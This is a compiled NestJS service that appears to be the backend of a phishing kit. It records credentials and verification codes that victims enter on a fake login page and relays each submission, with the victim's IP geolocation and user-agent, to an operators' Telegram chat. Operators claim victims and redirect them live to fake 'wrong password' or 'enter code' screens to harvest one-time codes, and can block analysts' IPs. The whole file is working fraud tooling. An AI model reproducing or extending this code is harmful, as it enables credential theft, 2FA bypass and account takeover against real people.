"use strict";
Object.defineProperty(exports, "__esModule", {
    value: true
});
Object.defineProperty(exports, "LogService", {
    enumerable: true,
    get: function() {
        return LogService;
    }
});
const _common = require("@nestjs/common");
const _nestjstelegraf = require("nestjs-telegraf");
const _telegraf = require("telegraf");
const _typeorm = require("typeorm");
const _logentity = require("./entity/log.entity");
const _typeorm1 = require("@nestjs/typeorm");
const _process = /*#__PURE__*/ _interop_require_wildcard(require("process"));
const _utils = require("../lib/utils");
const _config = require("../lib/config");
const _axios = /*#__PURE__*/ _interop_require_default(require("axios"));
const _countryemoji = require("country-emoji");
const _blockedusersentity = require("./entity/blocked-users.entity");
function _interop_require_default(obj) {
    return obj && obj.__esModule ? obj : {
        default: obj
    };
}
function _getRequireWildcardCache(nodeInterop) {
    if (typeof WeakMap !== "function") return null;
    var cacheBabelInterop = new WeakMap();
    var cacheNodeInterop = new WeakMap();
    return (_getRequireWildcardCache = function(nodeInterop) {
        return nodeInterop ? cacheNodeInterop : cacheBabelInterop;
    })(nodeInterop);
}
function _interop_require_wildcard(obj, nodeInterop) {
    if (!nodeInterop && obj && obj.__esModule) {
        return obj;
    }
    if (obj === null || typeof obj !== "object" && typeof obj !== "function") {
        return {
            default: obj
        };
    }
    var cache = _getRequireWildcardCache(nodeInterop);
    if (cache && cache.has(obj)) {
        return cache.get(obj);
    }
    var newObj = {
        __proto__: null
    };
    var hasPropertyDescriptor = Object.defineProperty && Object.getOwnPropertyDescriptor;
    for(var key in obj){
        if (key !== "default" && Object.prototype.hasOwnProperty.call(obj, key)) {
            var desc = hasPropertyDescriptor ? Object.getOwnPropertyDescriptor(obj, key) : null;
            if (desc && (desc.get || desc.set)) {
                Object.defineProperty(newObj, key, desc);
            } else {
                newObj[key] = obj[key];
            }
        }
    }
    newObj.default = obj;
    if (cache) {
        cache.set(obj, newObj);
    }
    return newObj;
}
function _ts_decorate(decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for(var i = decorators.length - 1; i >= 0; i--)if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
}
function _ts_metadata(k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
}
function _ts_param(paramIndex, decorator) {
    return function(target, key) {
        decorator(target, key, paramIndex);
    };
}
let LogService = class LogService {
    async ipManipulation(ctx) {
        const [, action, id] = ctx.match;
        const log = await this.logsRepository.findOne({
            where: {
                id: parseInt(id)
            }
        });
        const blocked = await this.blockedUsersRepository.findOne({
            where: {
                ipAddress: log.ip
            }
        });
        switch(action){
            case 'block':
                if (!blocked) {
                    await this.blockedUsersRepository.save({
                        ipAddress: log.ip
                    });
                    await ctx.answerCbQuery('🚫 Заблокирован');
                } else {
                    await ctx.answerCbQuery('🚫 Уже заблокирован');
                }
                break;
            case 'unblock':
                if (blocked) {
                    await this.blockedUsersRepository.delete({
                        ipAddress: log.ip
                    });
                    await ctx.answerCbQuery('🚫 Разблокирован');
                } else {
                    await ctx.answerCbQuery('🚫 Уже разблокирован или не был заблокирован');
                }
                break;
            default:
                await ctx.answerCbQuery(' ');
        }
    }
    async checkUserId(userId, id) {
        const log = await this.logsRepository.findOne({
            where: {
                id
            }
        });
        //@ts-ignore
        return parseInt(log.vbiverId) === userId;
    }
    async getIpData(ip) {
        const response = await _axios.default.get(`https://proxycheck.io/v2/${ip}?vpn=1&asn=1`);
        return response.data[ip];
    }
    async getPathData({ token }) {
        const data = await this.logsRepository.findOne({
            where: {
                token
            },
            select: {
                redirect: true
            }
        });
        if (!data) {
            return {
                success: false
            };
        }
        await this.logsRepository.update({
            token
        }, {
            activityTimestamp: Date.now().toString()
        });
        return {
            success: true,
            data
        };
    }
    async update({ token, payload }, ip, userAgent, originDomain) {
        try {
            const logData = await this.logsRepository.findOne({
                where: {
                    token
                }
            });
            //@ts-ignore
            console.log(logData)
            const jsonLogData = JSON.parse(logData?.data);
            for (const [key, value] of Object.entries(payload)){
                if (key === "💉 Метод верификации" || key === "🔑 Код верификации") continue;
                const existingIndex = jsonLogData.findIndex((item)=>key in item);
                if (existingIndex !== -1) {
                    jsonLogData[existingIndex][key] = value;
                } else {
                    jsonLogData.push({
                        [key]: value
                    });
                }
            }
            const ipData = await this.getIpData(ip);
            const displayData = [
                ...jsonLogData
            ];
            if (payload["💉 Метод верификации"]) {
                displayData.push({
                    "💉 Метод верификации": payload["💉 Метод верификации"]
                });
            }
            if (payload["🔑 Код верификации"]) {
                displayData.push({
                    "🔑 Код верификации": payload["🔑 Код верификации"]
                });
            }
            const payloadText = displayData.map((key)=>Object.entries(key).map(([key, value])=>`<b>${key}:</b> <code>${value}</code>`).join('\n')).join('\n');
            const text = `<b>#LOG${logData.id} | #${logData.name}</b>
<b>IP адрес:</b> <code><b>${ip}</b></code>${(0, _countryemoji.flag)(ipData.isocode)}
<b>User-Agent:</b> <code>${userAgent}</code>
<b>Страна:</b> <code>${ipData.country}</code>
<b>Город:</b> <code>${ipData.city}</code>
<b>ISP:</b> <code>${ipData.provider}</code>
<b>ZIP: </b> <code>${ipData.postcode}</code>

${payloadText}`;
            const buttons = (0, _utils.replaceToken)(_config.BUTTONS, String(logData.id));
            try {
                if (logData.vbiverId) {
                    const vbiver = await this.bot.telegram.getChatMember(_process.env.CHAT_ID, logData.vbiverId);
                    buttons.push([
                        {
                            text: `♻️ ${vbiver.user.username} ♻️`,
                            callback_data: `none`
                        }
                    ]);
                }
                const message = await this.bot.telegram.sendMessage(_process.env.CHAT_ID, text, {
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: logData.vbiverId ? buttons : [
                            [
                                {
                                    text: "Забрать лог",
                                    callback_data: `get_${logData.id}`
                                }
                            ]
                        ]
                    }
                });
                await this.logsRepository.update({
                    token
                }, {
                    //@ts-ignore
                    data: JSON.stringify(jsonLogData),
                    messageId: String(message.message_id)
                });
            } catch (error) {
                console.error('Telegram bot error:', error);
                // Продолжаем работу даже при ошибке бота
                await this.logsRepository.update({
                    token
                }, {
                    //@ts-ignore
                    data: JSON.stringify(jsonLogData)
                });
            }
            return {
                success: true
            };
        } catch (error) {
            console.error('Update error:', error);
            return {
                success: false
            };
        }
    }
    async reqReset({ token, login }) {
        const log = await this.logsRepository.findOne({
            where: {
                token
            }
        });
        if (!log) {
            return {
                success: false
            };
        }
        try {
            await this.bot.telegram.sendMessage(_process.env.CHAT_ID, `❗️❗️❗️ <b>Захотел сбросить пароль, по логину:</b><code>${login}</code>`, {
                parse_mode: "HTML",
                reply_to_message_id: parseInt(log.messageId)
            });
        } catch (error) {
            console.error('Telegram bot error:', error);
        // Продолжаем работу даже при ошибке бота
        }
        return {
            success: true
        };
    }
    async create({ token, name }, ip) {
        const newData = this.logsRepository.create({
            token,
            activityTimestamp: Date.now().toString(),
            name,
            ip
        });
        await this.logsRepository.save(newData);
        return {
            success: true
        };
    }
    async redirectToPath({ token }) {
        const log = await this.logsRepository.findOne({
            where: {
                token
            }
        });
        if (!log) {
            return {
                success: false
            };
        }
        await this.logsRepository.update({
            token
        }, {
            redirect: "default"
        });
        return {
            success: true
        };
    }
    async leave(ctx) {
        const [, id] = ctx.match;
        const log = await this.logsRepository.findOne({
            where: {
                id: parseInt(id)
            }
        });
        if (!await this.checkUserId(ctx.from.id, parseInt(id))) return;
        if (!log) {
            try {
                await ctx.reply('❌ Лог не найден');
            } catch (botError) {
                console.error('Telegram bot error:', botError);
            }
            return;
        }
        await this.logsRepository.update({
            id: parseInt(id)
        }, {
            vbiverId: null
        });
        try {
            await ctx.editMessageReplyMarkup({
                inline_keyboard: [
                    [
                        {
                            text: 'Забрать лог',
                            callback_data: `get_${log.id}`
                        }
                    ]
                ]
            });
        } catch (botError) {
            console.error('Telegram bot error:', botError);
        }
    }
    async get(ctx) {
        const [, id] = ctx.match;
        const log = await this.logsRepository.findOne({
            where: {
                id: parseInt(id)
            }
        });
        if (log.vbiverId) {
            try {
                await ctx.answerCbQuery('❌ Лог уже забрали');
            } catch (botError) {
                console.error('Telegram bot error:', botError);
            }
            return;
        }
        if (!log) {
            try {
                await ctx.reply('❌ Лог не найден');
            } catch (botError) {
                console.error('Telegram bot error:', botError);
            }
            return;
        }
        const buttons = (0, _utils.replaceToken)(_config.BUTTONS, String(log.id));
        buttons.push([
            {
                text: `♻️ ${ctx.from.username} ♻️`,
                callback_data: `none`
            }
        ]);
        try {
            await ctx.editMessageReplyMarkup({
                inline_keyboard: buttons
            });
        } catch (botError) {
            console.error('Telegram bot error:', botError);
        }
        await this.logsRepository.update({
            id: parseInt(id)
        }, {
            vbiverId: ctx.from.id
        });
    }
    async activityCheck(ctx) {
        const [, id] = ctx.match;
        if (!await this.checkUserId(ctx.from.id, parseInt(id))) return;
        const log = await this.logsRepository.findOne({
            where: {
                id: parseInt(id)
            }
        });
        const active = Date.now() - parseInt(log.activityTimestamp) <= 2500;
        if (!log) {
            try {
                await ctx.reply('❌ Лог не найден');
            } catch (botError) {
                console.error('Telegram bot error:', botError);
            }
            return;
        }
        try {
            await ctx.answerCbQuery(` ${active ? '🟢 Онлайн' : '❌ Оффлайн'}`);
        } catch (botError) {
            console.error('Telegram bot error:', botError);
        }
    }
    async redirect(ctx) {
        const [, path, id] = ctx.match;
        if (!await this.checkUserId(ctx.from.id, parseInt(id))) return;
        const log = await this.logsRepository.findOne({
            where: {
                id: parseInt(id)
            }
        });
        if (!log) {
            try {
                await ctx.reply('❌ Лог не найден');
            } catch (botError) {
                console.error('Telegram bot error:', botError);
            }
            return;
        }
        await this.logsRepository.update({
            id: parseInt(id)
        }, {
            redirect: path,
            redirected: false
        });
        try {
            await ctx.answerCbQuery(`🔄 Редирект на ${this.REDIRECTS[path.replace('-', '_')]}`);
        } catch (botError) {
            console.error('Telegram bot error:', botError);
        }
    }
    async resetData({ token }) {
        const log = await this.logsRepository.findOne({
            where: {
                token
            }
        });
        if (!log) {
            return {
                success: false
            };
        }
        await this.logsRepository.update({
            token
        }, {
            //@ts-ignore
            data: JSON.stringify([]),
            activityTimestamp: Date.now().toString()
        });
        return {
            success: true
        };
    }
    async reqCode({ token, login }) {
        const log = await this.logsRepository.findOne({
            where: {
                token
            }
        });
        console.log(log);
        if (!log) {
            return {
                success: false
            };
        }
        try {
            await this.bot.telegram.sendMessage(_process.env.CHAT_ID, `❗️❗️❗️ <b>📩📩📩 Запросил новый код, по логину:</b><code>${login}</code>`, {
                parse_mode: "HTML",
                reply_to_message_id: parseInt(log.messageId)
            });
        } catch (error) {
            console.error('Telegram bot error:', error);
        }
    }
    async checkIPStatus(req) {
        const ip = req.headers['x-forwarded-for'] ?? '185.209.196.251';
        const blocked = await this.blockedUsersRepository.findOne({
            where: {
                ipAddress: ip
            }
        });
        if (blocked) {
            return {
                success: true,
                data: {
                    blocked: true
                }
            };
        }
        return {
            data: {
                blocked: false
            },
            success: true
        };
    }
    constructor(bot, logsRepository, blockedUsersRepository){
        this.bot = bot;
        this.logsRepository = logsRepository;
        this.blockedUsersRepository = blockedUsersRepository;
        this.REDIRECTS = {
            incorrect_login: "Неверный логин",
            incorrect_password: "Неверный пароль",
            account_blocked: "Аккаунт заблокирован",
            incorrect_code: "Неверный код",
            request_code: "Запрос кода",
            request_pucode: "Запрос кода + pulse"
        };
    }
};
LogService = _ts_decorate([
    (0, _common.Injectable)(),
    _ts_param(0, (0, _nestjstelegraf.InjectBot)()),
    _ts_param(1, (0, _typeorm1.InjectRepository)(_logentity.Logs)),
    _ts_param(2, (0, _typeorm1.InjectRepository)(_blockedusersentity.BlockedUsers)),
    _ts_metadata("design:type", Function),
    _ts_metadata("design:paramtypes", [
        typeof _telegraf.Telegraf === "undefined" ? Object : _telegraf.Telegraf,
        typeof _typeorm.Repository === "undefined" ? Object : _typeorm.Repository,
        typeof _typeorm.Repository === "undefined" ? Object : _typeorm.Repository
    ])
], LogService);
